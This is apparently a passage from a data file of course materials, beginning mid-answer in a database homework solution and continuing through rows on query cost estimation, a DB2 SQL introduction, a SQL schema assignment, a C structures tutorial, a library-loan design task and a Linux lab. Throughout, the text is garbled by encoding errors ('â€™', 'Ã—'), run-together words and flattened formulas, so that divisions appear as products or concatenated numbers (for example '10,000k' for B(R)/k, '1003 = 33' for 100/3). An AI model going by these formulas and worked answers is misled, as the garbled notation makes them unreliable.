Ã—(10,000 + 10,000)= 60,000Requirement for M in the efficient sort-join algorithm is B(R) + B(S) â‰¤ M2 = 20,000â‰¤ 1,000,000 which is satisfied here.3Problem 3 Hash-based and Index-based joins (14 points)1. If B(R) = 10, 000 and B(S) = 30, 000 and M = 101, what is the number of disk I/Osrequired for the hash-join algorithm? (5 points)disk I/O estimation for hash-join algorithm is 3 Ã— (B(R) + B(S)) = 3 Ã— (10,000 + 30,000)= 120,000.2. Suppose B(R) = 10,000 and T(R) = 500,000. Let there be an index on R.a, and letV(R, a) = k for some number k. Give the cost of Ïƒa=0(R), as a function of k, under thefollowing circumstances. You may neglect disk I/Oâ€™s needed to access the index itself.(a) the index is clustering.Cost of Ïƒa=0(R) = B(R)k = 10,000kNote that if the index is clustered, then the arrangements of the index corresponds tothe blocks allowing fewer data block reads.(b) the index is not clustering.Cost of Ïƒa=0(R) = T(R)k = 500,000kThe cost is higher than scanning entire R, because index is not clustered.(c) R is clustered, and the index is not used.If R is clustered but we do not use the index, then we need to retrieve every block ofR, which in this case is 10,000 disk I/Oâ€™s.4Part 2Problem 4 Algebraic Laws (10 points, 5 points each)1. We consider two relations R(A, B, C) and S (C, D, E). Convert the following expressions in relational algebra by applying algebraic laws so that we can perform selections andprojections as early as possible.(a) ÏƒB=3ANDE=4(R !"" ÏƒC>10(S))Ïƒ(B=3)AND(C>10)(R) !"" ÏƒC>10ANDE=4(S)(b) Ï€A,D(R !"" S)Ï€A,D(Ï€A,C(R) !"" Ï€C,D(S))5Problem 5 Dynamic Programming (15 points)Compute the optimal plan for R !"" S !"" T !"" U using the technique of dynamic programming.We make the following assumptions (as we did in the class):â€¢ B(R) = 400, B(S) = 800, B(T) = 600, and B(U) = 700.â€¢ The size of a join for two relations R1 and R2 is estimated as: B(R1 !"" R2 ) = 0.01 Ã—B(R1) Ã— B(R2). If a subplan is a single relation and does not involve any join, the sizeof its intermediate result is zero.â€¢ The cost of a join is estimated to be the cost of the subplans plus the size of theintermediate results.â€¢ The cost of a scan is zero.Draw the table for dynamic programming, to show how you compute the optimal plan forall possible join orders allowing all trees.Figure 1: dynamic programming plan6Problem 6 Cost Estimation (15 points, 3 points each)Consider two relations R(A, B, C, D) and S (D, E) with the following statistics:T (R) = 100, V (R, A) = 100, V (R, B) = 10, V (R, C) = 1, V (R, D) = 50; T (S) =500, V (S, D) = 30, V (S, E) = 100.(a) Estimate the number of tuples in ÏƒB=25(R)T(ÏƒB=25(R)) = T(R)V (R,B) = 10010 = 10(b) Estimate the number of tuples in Ïƒ(B=25)AND(C=30)(R)T(ÏƒB=25ANDC=30(R)) = T(R)V (R,B)Ã—V (R,C) = 10010Ã—1 = 10(c) Estimate the number of tuples in ÏƒB>25(R)T(ÏƒB>25(R)) = T(R)3 = 1003 = 33(d) Estimate the number of tuples in Ïƒ(B>25)AND(B=15)(R)B =15 and B > 25 are mutually exclusive predicates, therefore T(Ïƒ(B>25)AND(B=15)(R))= 0(e) Estimate the number of tuples in R !"" ST(R !"" S) = T(R)T(S)max(V (R,D),V (S,D)) = 50,00050 = 1,0007Problem 7 Pipelining Versus Materialization (10 points)Consider physical query plans for the expression(R(w, x) !"" S (x, y)) !"" U(y, z)in Example 16.36 on page 831 of the textbook (We covered the same example in the class). IfB(R) = 2,000, how would you update the table in Figure 16.38 on page 834 of the textbook?Show the revised table. We use the same physical plans for the three cases in the tablerespectively.With all the other conditions kept consistent with the example in the textbook, the following are the only changes we need to consider:â€¢ Consider R!""S first. Neither relation fits in main memory so we use two-pass hash-joinmethod. The number of disk I/O for hash-based join is 3(B(R) + B(S)) given thatmin(B(R), B(S)) â‰¤ M2, which is satisfied here with B(R) = 2,000; min(2,000, 10,000)â‰¤ 1012. So the disk I/O for R !"" S is 3 Ã— (2,000 + 10,000) = 36,000.â€¢ The number of blocks required to store R in the main memory is ceil( 2,000101 ) = 20. Thismeans the rest of 80 blocks can be used in the join operation, and remaining 1 bucketis used as an output buffer.The updated table is as follows:Figure 2: cost of physical plan"
Introduction to Database Systems Design,4350,SQL intro,"CPS352	Database	Systems:	SQL	Homework	IntroIntroduction	to	SQL	Homework	ProblemsSeveral of the homework sets in the course include problems designed to help you develop skills with Structured Query Language (SQL). Early assignments will largely be a review of concepts you have already seen in CPS221, while later assignments will introduce you with new features of SQL, more or less correlated to the theoretical topics being discussed in class.Many of the problems will involve a database called sample that is distributed with DB2. The tables in this database correspond to the attached ER diagram. The commands used to create this database and the complete contents of each table are listed in the Appendix of the DB2 SQL Cookbook by Graaeme Birchall. Spend some time familiarizing yourself with the structure of this database before attempting the homework problems that pertain to it. You can do these problems on the department workstations. (See below for details.)You will be expected to research the information needed to answer these problems from the following sources (available as PDF documents on the Resources page of the course website). (Some suggestions as to where to look may be included in the homework.) Generally speaking, you will find the Birchall book to be the best place to start; however, he does not cover all of the features of SQL. Birchall, Graeme. DB2 LUW V9.7 Cookbook.IBM. IBM DB2 Universal Database SQL Reference (2 volumes) For these problems, you will be expected to turn in a copy of the query (neatly formatted using multiple lines and indentation) and the results generated by executing the query, created by selecting an appropriate portion of the screen and saving it to a file. Be sure to include the line at the end that says ___ record(s) selected. For example, if the question were â€œwhat is all the information stored in the org tableâ€, the following formatted information would suffice. Manually verify the output printed by db2 against the table contents in Birchall to be sure youâ€™ve gotten the right answer - this becomes increasingly important as the assigned queries become more complex!select * from org;DEPTNUMB DEPTNAME MANAGER DIVISION LOCATION -------- -------------- ------- ---------- ------------- 10 Head Office 160 Corporate New York 15 New England 50 Eastern Boston 20 Mid Atlantic 10 Eastern Washington 38 South Atlantic 30 Eastern Atlanta 42 Great Lakes 100 Midwest Chicago 51 Plains 140 Midwest Dallas 66 Pacific 270 Western San Francisco 84 Mountain 290 Western Denver 8 record(s) selected.Abbreviated	Usernames	for	DB2	on	Linux	SystemsDB2 on Linux limits user id values to 8 characters, and in one case only 7 characters are used. Since your Linux username is usually of the form firstname.lastname, you will be given a special abbreviated 2alias for work with DB2. This alias will access the same Linux account as your full username (and you can use either when logging in to Linux), but you must use the abbreviated alias whenever you interact with DB2.The	Notion	of	a	schema	in	DB2DB2 refers to tables by a compound name of the form schema-name.table-name. This allows one database to contain several subsets of tables. Generally, the schema name for a table is the same as the username of the creator. For most of the databases on the server, the schema name will be db2inst1 -the name of the administrative user for the database instance on the server. Thus, if you wished to list all the rows in a table called borrower in a database on the server, you would use the commandselect * from db2inst1.borrowerTo avoid having to qualify names with a schema name all the time, issue the following command to set the default schema. (You will normally need to do this anytime you are accessing a database on the server for homework problems - but not when doing projects, where you want your username to be the schema name.)set schema schema-nameFor example, the above query could also be executed this way (which is preferable if you needed to access several tables)set schema db2inst1select * from borrowerUse	of	the	Semicolon	as	a	SQL	Statement	Terminator	in	DB2Most DBMSâ€™s expect you to terminate a SQL statement with a semicolon. By default, DB2 does not (hence the absence of the semicolon in the above examples). If you enter a semicolon when one is not expected, DB2 will reject your statement!Alternately, you can set DB2 to expect semicolons by starting it with the commanddb2 -trather than simplydb2This is the preferred approach, since terminating a SQL statement with a semicolon is the norm with most versions of SQL.3Using	DB2	on	the	Workstations1. Log into one of the Linux workstations. These have a client version of db2 installed on them. (For this purpose you can use either your regular or abbreviated username).2. Issue the following command. (Note that the first character on the line is a dot, and one space separates it from the rest of the line. Also note that db2 limits certain names to 8 characters - hence â€œclienâ€ as opposed to â€œclientâ€.. ~db2clien/sqllib/db2profileThis serves to define various commands and symbols needed by db2, using a â€œprofileâ€ associated with the client installation of db2. Alternately, you can put the above line into the .bashrc file in your home directory, and this task will be done automatically whenever you login to a workstation.)3. Issue the following command to start db2 with semicolon as the statement terminator:db2 -t4. Issue the following command to db2 to connect to the sample database:connect to sample user your-abbreviated-username ;then type your Linux password when prompted to do so. (This serves to authenticate you to the db2 server where the database resides.)5. Issue the following command to db2 to avoid having to type the schema name in front of the name of each table:set schema db2inst1; 6. You can edit the previous command using your favorite editor by using a command likeedit editor pico;(Note: db2 loses formatting information when editing a command, so you may have to re-edit and select and print in pico to produce well-formatted output.)7. When you are all through with the db2 session, issue the following command to db2:terminate; (Explicitly terminating your session this way is very important)4Structure	of	the	sample DatabaseAs you can see from the diagrams on the following page, the sample database consists of two groups of tables containing somewhat similar information, plus several independent tables. This is not meant to be an example of good database design, but rather as a basis for SQL examples. (Most of the examples in the Birchall book use this database, as does some of the documentation published by IBM.)One group of tables (org and staff) records information about people working for various departments within a company. The â€œworks forâ€ relationship is represented by each entry in the staff table containing a foreign key (dept) referring to the primary key (deptnumb) of the appropriate row in the org table. The â€œmanagerâ€ relationship is represented by each entry in the org table containing a foreign key (manager) referring to the primary key (id) of the appropriate row in the staff table. Another group of tables has a similar structure involving the department and employee tables (though the field names are different). In addition, this group of tables includes one that records information about projects (project) - each of which is associated with a specific department, and is the responsibility of a particular employee. Moreover, a project may be a part of a larger project. (This information is represented by the foreign keys deptno, respemp and majproj). For each project, the emp_act table records information about various activities - each performed by a particular employee. Note that this must be an entity, not a relationship, because a given employee may be involved in several activities for a given project. Finally, for some of the employees, their photo and/or resume is stored in the database as a binary large object (blob) or character large object (clob).There are also three standalone tables not connected to any other tables. In fact, two donâ€™t initially contain any data. (They are for practice with insert)"
Introduction to Database Systems Design,4350,Cost calculations,"CS 533 Database Management SystemsHomework Assignment 1 - Due September 17, 2010 Friday1. Consider the join R âŠ²âŠ³R.a=S.b S, given the following information about the relations to be joined. The costmetric is the no. of page I/Os unless otherwise noted, and the cost of writing out the result is uniformlyignored.â€¢ Relation R contains 200,000 tuples and has 20 tuples per pageâ€¢ Relation S contains 4,000,000 tuples and also has 20 tuples per pageâ€¢ Attribute a of relation R is the primary key for Râ€¢ Each tuple of R joins with exactly 20 tuples of Sâ€¢ 1002 buffer pages are availableAnswer the following questions. If some question is inapplicable, explain why.(a) What is the cost of joining R and S using a page-oriented simple nested loops join? What is the no. ofbuffer pages required for this cost to remain unchanged?Cost = 10,000 + (10,000 * 200,000) = 2,000,010,000. Min. no. of buffer pages = 3.(b) What is the cost of joining R and S using a block nested loops join? What is the no. of buffer pagesrequired for this cost to remain unchanged?Cost = 10,000 + 200,000*âŒˆ10,0001002âˆ’2âŒ‰ = 2,010,000. Min. no. of buffer pages = 1002.(c) How many tuples does the join of R and S produce at most, and how many pages are required to storethe result of the join back to disk?Since R.a is the primary key, any tuple in S can match at most one tuple in R. So, the max. no. of tuplesin the result is equal to the number of tuples in S which is 4,000,000.The size of a tuple in the result will be approx. double the size of R. Thus, only 10 tuples can be storedin a page. Storing 4,000,000 tuples at 10 per page would require 400,000 pages in the result.(d) Would any of your answers change if you were told that R.a is a foreign key that refers to S.b? Explain.It would contradict the statement that each R tuple joins with exactly 20 S tuples.2. Consider the following relation:â€¢ Employees(eid: integer, ename: string, sal: integer, title: string, age: integers)1Suppose the data entries (leaf nodes) of the indexes are of the form < search key,record id >. We have thefollowing indexes: a hash index on eid, a B+ tree index on sal, a hash index on age, and a clustered B+ treeindex on < age,sal >. Each Employees record is 100 bytes long, and you can assume that each index dataentry is 20 bytes long. The Employees relation contains 10,000 pages. Each data page contains 20 records perpage.(a) Consider each of the following selection conditions and assuming that the reduction factor for eachterm that matches an index is 0.1, compute the cost of the most selective access path for retrieving allEmployees tuples that satisfy the condition:i. sal > 100Filescan is best with cost 10,000.ii. age = 25Clustered B+ tree. Cost = 2(lookup) + 10000*0.1(selectivity) + 10,000*0.2*0.1 = 1202.iii. eid = 1000Cost = 1.2 (lookup) + 1 = 2 or 3.iv. sal > 200âˆ§age = 20Clustered B+ index on < age,sal >. Cost = 2 (lookup) + 10,000*0.1*0.1 + 10,000*0.4*0.1*0.1 =142.v. sal > 200âˆ§title = â€˜CFOâ€²Filescan. Cost = 10,000.(b) Suppose that for each preceding selection conditions, you want to retrieve the average salary of qualifying tuples. For each selection condition, describe the least expensive evaluation method and state itscost.i. sal > 100Index only scan using the unclustered B+ tree index on sal. Cost = 2 (lookup) + 10,000*0.1*0.2 =202.ii. age = 25Clustered index on < age,sal >. Cost = 2 (lookup) + 10,000*0.1*0.4 = 402.iii. eid = 1000Cost = 1.2 (lookup) + 1 = 2 or 3.iv. sal > 200âˆ§age = 20Clustered B+ tree index for an index only scan. Cost = 2 (lookup) + 10,000 * 0.1 * 0.1 * 0.4 = 42.v. sal > 200âˆ§title = â€˜CFOâ€²Filescan. Cost = 10,000.(c) Suppose that for each preceding selection conditions, you want to compute the average salary for eachage group. For each selection condition, describe the least expensive evaluation method and state itscost.i. sal > 100Cost = 2 (lookup) + 10,000*0.4 = 4002.2ii. age = 25Clustered B+ index in an index only scan. Cost = 2 (lookup) + 10,000 *0.1 *0.4 = 2 + 400 = 402.iii. eid = 1000Hash index. Cost = 1.2 (lookup) + 1 = 2 or 3.iv. sal > 200âˆ§age = 20Clustered B+ index over < age,sal > for index only scan. Cost = 2 + 10,000*0.4*0.1*0.1 = 42.v. sal > 200âˆ§title = â€˜CFOâ€²Scan of < age,sal > and then getting each relation from the relation page. Cost = 2 + 10,000 * 0.4+ 10,000*20(no. of tuples per page) * 0.1 = 24002.3. You are given the following information.â€¢ Executives has attributes ename, title, dname, and address; all are string fields of the same length.â€¢ The ename attribute is a candidate key.â€¢ The relation contains 10,000 pages.â€¢ There are 10 buffer pages.Consider the following query:SELECT E.title, E.ename FROM Executives E WHERE E.title = â€˜CFOâ€™Assume that only 10% of Executives tuples meet the selection condition.(a) Suppose that a clustered B+ tree index on title is the only index available. What is the cost of the bestplan?Cost = 2 (finding the first title) + 10,000*0.1 (getting 10% of data pages) + 2,500 * 0.1 (scanning theindex) = 1252.(b) Suppose that a unclustered B+ tree index on title is the only index available. What is the cost of the bestplan?Filescan. Cost = 10,000.(c) Suppose that a clustered B+ tree index on ename is the only index available. What is the cost of the bestplan?Filescan. Cost = 10,000.(d) Suppose that a clustered B+ tree index on address is the only index available. What is the cost of thebest plan?Filescan. Cost = 10,000.(e) Suppose that a clustered B+ tree index on < ename,title > is the only index available. What is the costof the best plan?Scanning the entire index = 10,000 * 0.5 = 5,000"
Introduction to Database Systems Design,4350,SQL statements,"CS 430 - Database SystemsHomework Assignment 2(Due February 13, Thursday)1. Answer each of the following questions briefly. The questions are based on the following relational schema:Emp(eid: integer, ename: string, age: integer, salary: real)Works(eid: integer, did: integer, pct time: integer)Dept(did: integer, dname: string, budget: real, managerid: intger)(Please note that primary key constraints are underlined.)i. Give an example of a foreign key constraint that involves the Dept relation. What arethe options for enforcing this constraint when a user attempts to delete a Dept tuple ?ii. Write the SQL statements required to create the preceding relations, including appropriate versions of all primary and foreign key integrity constraints.iii. Define the Dept relation in SQL so that every department is guaranteed to have a manager.iv. Write an SQL statement to add John Doe as an employee with eid = 101, age = 32and salary = 1500v. Write an SQL statement to give every employee a 10 percent raise.vi. Write an SQL statement to delete the Toy department. Given the referential integrityconstraints you chose for this schema, explain what happens when this statement isexecuted.2. A database company called ArtBase builds a product for art galleries. The core of this productis a database with a schema that captures all the information that galleries need to maintain.Galleries keep information about artists, their names (which are unique), birthplaces, age andstyle of art. For each piece of artwork, the artist, the year it was made, its unique title, itstype of art (e.g. painting, lithograph, sculpture, photograph), and its price must be stored.Pieces of artwork are also classified into groups of various kinds, for example, portraits, stilllifes, works by Picaso, or works of the 19th century; a given piece may belong to more thanone group. Each group is identified by a name (like those just given) that describes the group.Finally, galleries keep information about customers. For each customer, galleries keep thatpersonâ€™s unique name, address, total amount of dollars spent in the gallery, and the artistsand groups of art that the customer tends to like.The ER diagram for this application is as follows.1Define the relational schema corresponding to the above ER diagram. (Use the same notationas in Question 1 to represent a schema.)3. Implement the schema you derived for Question 2 in PostgreSQL. Use your default databasein the PostgreSQL instance in the department for this task.After the schema is implemented, using the tool psql:i. Get the list of tables in your database.ii. Description of each table (using \d+ command).Paste the output produced by the above commands into a text file. This text file should benamed as per the format lastname firstname.txt. For example, for the student John Doe,this file should be named as doe john.txt.Submission InstructionsAnswers for Questions 1 and 2 should be typed and exported as a single PDF file. This PDF filealong with the text file with answers for Question 3 should be compressed in to a single Zip archiveand submitted through RamCT. This Zip file should be named as lastname firstname.zip. Ifthe student name is John Doe, the Zip archive should be named as doe john.zip.Please keep in mind:â€¢ This assignment is to be done individually. The honor code is in effect.â€¢ Submission must be made through RamCT by Thursday, February 13.â€¢ No late work will be accepted except in exigent situations.â€¢ Please strictly follow the submission instructions mentioned above."
Computer Science II,1040,Structures as Aggregates of Heterogeneous Data,"HW1: Structures as Aggregates of Heterogeneous DataIn discussing programming languages we often differentiate between two different types of dataâ€œcollectionsâ€ depending upon whether the data (often variables) have a single value (calledscalars) or whether they contain multiple values (called aggregates). You are already familiarwith using arrays to support multiple values of the same type, such as arrays of integers, arraysof floats, arrays of characters, etc. And arrays are quite useful. But many times the data that youwish to maintain in an aggregate is not all of one type. We call this heterogeneous data. Forexample, think of the data that a university stores about each student. Some of that data is astring (name) stored in C as an array of characters. Other data about a student might be a gradepoint average, typically stored as a float, or mailing address which itself is heterogeneous dataincluding integers such as street number, apartment number (possibly) and zip code. But thenthere is the street name, the county and state names (or maybe an abbreviation). And wait aminute; even the zip typically has a dash in it. Of course, we could represent all of the address asa string, but perhaps the university would like to look for all folks who live in the 1700 block ofState Street. It would be easier to do this if the address, which is part of a student record, wasstored as an aggregate inside another aggregate, the student record.The goal of this tutorial and assignment is to both motivate the use of heterogeneous aggregates(called structures in C) and introduce you to some of the many ways they can be useful in programming.So, letâ€™s start with how one declares a structure in C. The code,struct studentData{char lastName[30];char firstName[30];char idNum[9];int exam1;int exam2;int exam3;float avg;char grade;} student; // makes a variable called student which is a struct// with fields as defined above.Each of the â€œfieldsâ€ as they are called has a declaration like youâ€™ve seen before. To access a fieldof a struct (student in this case) we use the â€˜.â€™. So, if we wished to say that our hypotheticalstudent received a 75 on exam 1, we could just do an assignment, such asstudent.exam1 = 75;In fact, this might be a good time for you to copy all of the files (and directories) in the tutorialdirectory to one of your own. Iâ€™m sure you already know how to do this having been copyingfiles all term long, but the â€œmagicâ€ command is:cp â€“r ~dmk0080/public/1040/hwk/one/tutorial .Make sure that you include both the â€“r (for recursive) and the â€˜.â€™ at the end to indicate where toplace the copy of that directory. If you have any questions at all about how this command works,ask someone, a TA or grader, or a peer mentor if one is available.One of the files that you just copied is a C file, called simpleExample.c, which uses the verystructure definition listed above. Look at the code to see how structure fields (of â€œstudentâ€) areaccessed in both the scanf and printf statements. At this point in the term your probablyunderstand why some fields in the scanf include an â€˜&â€™ and others donâ€™t. But if not, asksomeone. Go ahead and run the simpleExample.c program, but typinggcc simpleExample.c./a.out < datathereby reading the input from the file â€œdataâ€ which is also included in the directory.Ok, next while still on (basically) the same program Iâ€™d like to make a change. Since oneâ€™s gradetypically depends upon more than just exams, but also homework, labs, and programs, weâ€™d liketo add fields for those. Well, we can do that easily, BUT, letâ€™s try something different (perhaps) tomake our example a little more â€œreal-worldâ€ (and harder, of course). Instead of just adding newfields, letâ€™s make structures for exams, programs, labs, and homework. Weâ€™ll make each of thesestructures pretty simple, just including places to put integer scores (3 for exams, 10 for labs, 4 forprograms, and 6 for homeworks) and for each type of work have a float value for average. Take 5minutes (no more because weâ€™ve lots to do) to think about how you could define these structures,possibly working with a few other students. Then weâ€™ll look at two different solutions.Welcome â€œback.â€ There are two â€œobviousâ€ ways we can solve this problem. The first is just tonest additional structure definitions into the definition of the â€œstudentâ€ structure variable. Theprogram nestedStructure.c shows this method. (Notice that I didnâ€™t actually read in any data forthe programs, labs or homework, but I DID (need to) change way that I accessed the exam data.Before it was just:student.exam1 ...but now, since the exam scores are in a structure of their own I need an â€œextraâ€ access, namelystudent.exams.exam1 ...The other way I could have organized the â€œnestedâ€ structures was to define several structuresoutside the structure defining the student variable. Look at outsideStructure.c for an example.Notice that now, accessing the previously defined aggregates (structs) is a little different. Todeclare a field within the (structure) student variable, I need to use the keyword struct AND thename that immediately follows it in the outer declaration, for examplestruct studentRecord {...struct examScores exams;...}Again, if you have questions you are encouraged to ask someone and keep asking until you getyour concerns resolved.To give you a bit of practice, choose either the nestedStructure.c or outsideStructure.c toâ€œcompleteâ€. Make a copy of that .c file and of data. Of course youâ€™ll call them something otherthan the original names of those files. In your new data file (data2 or maybe bigData), addenough data for the programs, labs and homeworks for each of the 7 â€œstudentsâ€ listed. Add inany integer scores that seem appropriate. Then go to your copied â€œCâ€ file and add to the scanfand printf statements to read and write the new fields weâ€™ve just added. It should be relativelysimple as youâ€™ll have a â€œtemplateâ€ to work with in regards to the limited fields ofnestedStructure.c or outsideStructure.c, whichever you chose to copy. Compile and run yourprogram as before (using the new larger data file you added to, of course.)Now, letâ€™s move on. So far, we have been dealing with structures themselves, but more often inprogramming, youâ€™ll be working with structures â€œindirectlyâ€ using pointers to structures. Pleaselook at the example program v4.h and v4.c. Again, we have much the same program assimpleExample.c but instead of using structure definitions we use pointers to structures. Thiswill give us a distinct advantage in many cases, as Iâ€™ll show in a much larger example that weâ€™llbe using for the next few labs, namely a â€œdatabaseâ€ program. But more on that later.First, look at v4.h. Youâ€™ve seen .h (or header) files before and it is quite common for larger Cprograms to have several .h files. The main thing we have used the .h file for here is to declarethe student structure as a type (notice the keyword â€œtypedefâ€) so that instead of declaringvariables in the program (v4.c) asstruct something someVariableNameWe can make a new name for struct something and just call it something, thereby allowingdeclarations likesomething someVariableNameMoving on to v4.c, notice that student is not defined to be a studentRecord, but rather to be apointer to a studentRecord. This means that we have to do a bit more work (dynamicallyallocate the actual structure) but it has one GREAT advantage in â€œreal programmingâ€ (whateverthat might be.) That is because C does not allow aggregates to be passed as parameters tofunctions or returned from functions. Instead, function parameters and return valuesâ€œrepresentingâ€ aggregates need to be passed as POINTERS to aggregates. (â€œWaitâ€ I hear youcry, we pass arrays to functions all the time. Actually, you donâ€™t. It is just that arrays in C aredefined to have a â€œvalueâ€ that is the address of the start of the array, which is exactly what apointer is --- an address. But C doesnâ€™t have such a rule for structures).Ok, the only new wrinkles to the code in v4 are that, since weâ€™re using pointers to structuresrather than structures themselves, we need to allocate space (using malloc) for the actualstructure itself and the way we access the fields is different. Look closely at v4.c to notice boththe dynamic allocation (malloc) statement and the change from using â€œ.â€ to â€œ->â€ to access thefields. Then compile and run v4.c by:gcc v4.c./a.out < dataNow, let me repeat myself. The main reason we use pointers a great deal with structures is that inbigger programs that use structures we usually want to pass those â€œstructuresâ€ around amongfunctions that read them, sometimes change them and often return them. And you can only passand return aggregates (other than arrays) as pointers to the aggregate rather than the aggregateitself.One last thing to talk about for this lesson is the often need to have arrays of pointers. Tomotivate this, Iâ€™m going to â€œpointâ€ you (sorry about that) to the database program that you nowhave as a directory in your code. This database application (and calling it a database isreally exaggerating but it does do some of the things that a database program would do)maintains heterogeneous data for a number of fictitious students. The specific fields arenâ€™tterribly important except that like all â€œgoodâ€ databases we wish to be able to locate all therecords that match some characteristics, like â€œfirst-year students with grade point averages below2.0â€ or â€œall students whose expected graduation date is before 2016â€. To answer these kinds ofquestions, we need to sort the records based upon many different fields of the structure.Compared to using multiple arrays of structures (one for each field of interest) and moving thestructures around during sorting, it is MUCH more efficient (and less error prone) to have onecopy of each student record and then maintain several arrays of pointers to the data (one array ofpointers for expected graduation year, one for class in school, one for age, one for grade-point,etc.) and then â€œsortâ€ the data by moving the pointers around in the arrays to represent orderingamong records based upon that field. In the database directory that you copied, look at the filedb.c and look for the function buildDataBase() in db.c. In that function the variabletheDataBase, a global variable by the way (shame on me!), is used to create the â€œentireâ€database that is eight arrays of pointers to structures. Look specifically at lines 63 (a comment)through 111 to see how the database is allocated (malloc of course), how individual DBRecordstructures are allocated (again malloc), how the input data is read into the record just allocated(scanf) and (in lines 109 and 110) the 8 arrays of pointers are initially all set to point to the numDBRecords of the database. Later on, sorting occurs so that each of the 8 arrays of pointers toDBRecord structs lists the pointers in order of the DBRecord field associated with that array.Declaring arrays of pointers to structures is not hard. If our structure definition is calledâ€œstudentâ€, thenstudent *classOrder[36000];student *gpaOrder[36000];student *expectedGradYear[36000];declares three different arrays each of which can be ordered based upon a different field of thestudent records in the database.no need to submit your tutorial filesI hope that at this point, youâ€™re ready for your homework. Good Luck!"
Computer Science II,1040,Classes and structures,"CSCE 1040 Homework 2For this assignment we are going to design a system to Manage loans from the local public libraryFor this we will need the following entities, plus collections for each of theentities: Patrons, Books and LoansThe data for a Book will contain at least the following:AuthorTitleISBN NumberLibrary ID numberCostCurrent Status (In, Out, Repair, Lost)You may add other data needed for your implementation as well as you will need accessor and mutator functions for the data.The data for a Patron will contain at least:Name (e.g. Fred Smith)ID number (6 digits e.g. 123456)Fine BalanceCurrent # of books outYou may add other data needed for your implementation as well as you will need accessor and mutator functions for the data.The data for a Loan (The transaction entity) will contain at leastthe following:Loan IDBook IDPatron IDDue Date and TimeCurrent Status (overdue, normal)You may add other data needed for your implementation as well as you will need accessor and mutator functions for the data.For the collections of each of the Patrons and Books Classes identified above youwill need to include the ability to:AddEditdeleteSearch/Find based on appropriate criteriaPrint a list of all entries in the collectionPrint the details for a single entity (do a find first)Other methods you may identifyFor Loans you will need:Check Out a book (update book and patron info as well as add a loan)Check in a book (check for fines and update patron and book info and delete loan)List all overdueList all books for a particular patronUpdate loan status based on system clockRe-Check a bookEdit a loanReport lost (update book and charge patron book cost as well)Other methods you may identifyYou will need to verify the followingBefore borrowing a book, make sure Patron has no overdue books and that total books out will be <= 6 including new borrowWhen checking a book in, determine if fines are owedReporting a book as lost records the cost of the book to the patrons fine balanceFor Loans Add = Borrow a bookDelete = Return a bookEdit = Re-checkAlso will need a PayFines (in Patrons)Report Lost (in Loans but will have to update books and patrons)Print a list of overdue books with patron info (in loans but will have to update books and patrons)You will need to provide an appropriate menu system that can be multi-levelif you like.Do not attempt to provide card catalog services for allowing patrons to search for books. You may assume each book has a unique acquisition number, and you may use these numbers to refer to books borrowed and returned. You will need to load and store the data. This can be done automaticallywhen the program starts and ends. You should also want to store after anadd, delete or edit to make sure changes to the data are preserved.You can assume the followingLoan period is 10 days with an additional recheck of 10 days (1 recheck only)A max of 6 books can be out to a single patron at a timeFine rate is $0.25 per day (24 hour period)For this design you will need to turn in the following:A diagram set consisting of:A title page with your name, assignment, course and titlea single class diagram showing only the relationships between the entitiesa set of six individual class diagrams showing the attributes and methods for each of the classes in #2Step by Step pseudo code algorithms for every method defined in every class inthe diagram from #2. You do not need to provide pseudo code for simple accessor and mutator functions (i.e. sets and gets)A 1-2 paragraph report about your design experience. All of these items should be gathered together, in order, in a single PDFFile that you will turn in on CanvasNOTE: This assignment is for the design onlyNothing you turn in should look like C/C++ code"
Computer Science II,1040,Linux,"Lab 0 â€“ Linux TutorialThe goal of this lab is to introduce the Linux environment and some tools you will use throughout thesemester. Read through this tutorial and practice the steps multiple times. Complete the lab by performingthe steps in Part VI.Part I â€“ Logging in to the CSE using SSH and SFTPLocate and start the PuTTY application. For the hostname, enter one of the following hosts, making surethe Connection Type is SSH and the Port number is 22.Click Open to connect to the host. You will be prompted for your username and password. This is yourEUID username and password. Note that your password will not appear as you type. After logging in, youwill be at the Linux command line prompt.Now, locate and start the WinSCP application. Click New to start a new session. Like with PuTTY, enterone of the hostnames above into the Host name field, making sure the File protocol is set to SFTP withPort number 22. The username and password is your EUID username password. Once entered, clickLogin to connect to the server.You now have two applications that will allow you to access the CSE servers. PuTTY is used to access thecommand prompt so you can perform operations, write scripts, compile and run programs, etc. WinSCPwill allow you to transfer files between your computer and the server using drag and drop.Part II â€“ Basic Linux OperationsListing DirectoriesListing directories is done using the ls command. Type ls at the command prompt and hit enter to see thefiles and subdirectories in your directory, which is known as your home directory. You can get moredetailed information by using additional options. For example, try the following commands and note thedifferences.â€¢ ls â€“aâ€¢ ls â€“lâ€¢ ls â€“alNow try listing files in another directory. Enter the following commands:â€¢ ls ~dmk0080/public/1040/labs/zero -lâ€¢ ls ~dmk0080/public/1040/labs/zero/programs -lYou can use the tab key to auto complete when typing a directory or file name. For example, type the lastlisting command over, but this time, only type the first two letters of a directory name and press the tabkey to auto complete. Sometimes you may need to type more than two letters because the auto completeneeds enough characters to distinguish from similar names. You can also use the arrow keys, up anddown, to scroll through previous commands.Creating Directoriescse01.cse.unt.edu cse02.cse.unt.edu cse03.cse.unt.edu etc.You can use up to cse09.cse.unt.eduYou can use up to cse09You caCreating directories is done using the mkdir command. To create a directory within the directory you arecurrently in called tutorial, enter mkdir tutorial at the command prompt and use ls to see the createddirectory. Try this now:â€¢ mkdir tutorialâ€¢ lsNow create a subdirectory within tutorial called temp. You can do this by changing directories first(changing directories will be discussed next) or by listing the parent directories for the new directory. Sofor example, try the following. It works by having the system descended into the tutorial directory, whichis in the current directory, and then creating the directory temp.â€¢ mkdir tutorial/tempâ€¢ lsâ€¢ ls tutorialâ€¢ ls tutorial/tempChanging DirectoriesChanging directories is done using the cd command. This command followed by a subdirectory name willmove you to that subdirectory. For example, try:â€¢ cd tutorialâ€¢ cd tempYou are now in the tutorial/temp directory. The Linux file directory is viewed as a hierarchy in whichsubdirectories are children of one parent directory. This â€œone parent has many children relationshipâ€means we can move up to a parent directory without knowing its name. This is done by using .. (twoperiods) to designate you want to move up one directory in the hierarchy. So if you are in the tutorial/temp directory, you can do cd .. to move up to the tutorial directory. Or to get back to the parent oftutorial, try cd ../../ to move from temp, to tutorial, to its parent. Try this from the temp directory:â€¢ cd ../../â€¢ lsYou can mix them together. For example, cd ../../tutorial from the temp directory will move you into thetutorial directory because of the first ../, the next ../ moves you into the parent of tutorial, and tutorial/moves you into the tutorial directory. Needless to say, this example is trivial because you could have doneit by typing cd ../ from the temp directory. The idea is that you can quickly navigate the hierarchy in asingle command if you know how it is organized. Some other useful ways to change directories include:â€¢ cd ~ returns you to your home directory. You can build paths using this, e.g. cd ~/tutorial/temp â€¢ cd - displays the full path from the root to the current directory â€¢ cd / changes to the root directory of the drive. 